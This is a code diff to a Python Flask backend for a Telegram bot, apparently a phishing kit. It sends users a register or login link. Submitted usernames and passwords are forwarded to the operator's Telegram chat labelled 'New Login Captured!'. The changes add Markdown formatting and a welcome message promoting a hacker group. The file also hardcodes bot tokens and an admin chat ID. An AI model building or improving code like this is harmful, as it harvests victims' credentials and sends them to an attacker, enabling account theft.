@@ -14,7 +14,7 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "8472535428:AAGAcUvGClisEF9Kr0MsaKLGw5Je
 # Admin Bot Token
 ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8218726690:AAHMwmdce9LJA1GPovRo4Exk4ON7_P4CUdY")
 
-# Admin Telegram Chat ID (তোমার নিজের ID)
+# Admin Telegram Chat ID
 ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1849126202")
 
 # Frontend Netlify URL
@@ -45,7 +45,7 @@ def save_users():
 def send_message(chat_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     try:
-        requests.post(url, json={"chat_id": chat_id, "text": text})
+        requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
     except Exception as e:
         print(f"❌ Error sending message to {chat_id}: {e}")
 
@@ -75,7 +75,14 @@ def telegram_webhook():
         
         if text.lower().strip() == "/start":
             reg_url = make_register_url(chat_id)
-            welcome = f"🤖 Welcome!\nPlease Register/Login here:\n{reg_url}"
+            welcome = (
+                "🤖 *Welcome to VS Bot!*\n\n"
+                "Please register or login using the link below 👇\n"
+                f"[🔗 Click here to Register/Login]({reg_url})\n\n"
+                "👨‍💻 *Developer:* [@noobxvau](https://t.me/noobxvau)\n"
+                "💬 *Join our official group for more updates:*\n"
+                "👉 [@noobhackerbd](https://t.me/noobhackerbd)"
+            )
             send_message(chat_id, welcome)
 
             # ইউজার রেজিস্টার করা
@@ -95,13 +102,13 @@ def receive_login():
     password = data.get("password", "")
     
     if uid and uid in registered_users:
-        msg = f"🧾 Login Info\n👤 Username: {username}\n🔑 Password: {password}"
+        msg = f"🧾 *Login Info*\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`"
         
         # ইউজারকেও পাঠাও (login info)
         send_message(uid, msg)
 
         # এডমিনকেও পাঠাও
-        admin_text = f"📩 New Login Captured!\n👤 UID: {uid}\n{msg}"
+        admin_text = f"📩 *New Login Captured!*\n👤 *UID:* `{uid}`\n{msg}"
         send_admin_message(admin_text)
 
         print(f"✅ Sent login info to user {uid} and admin.")
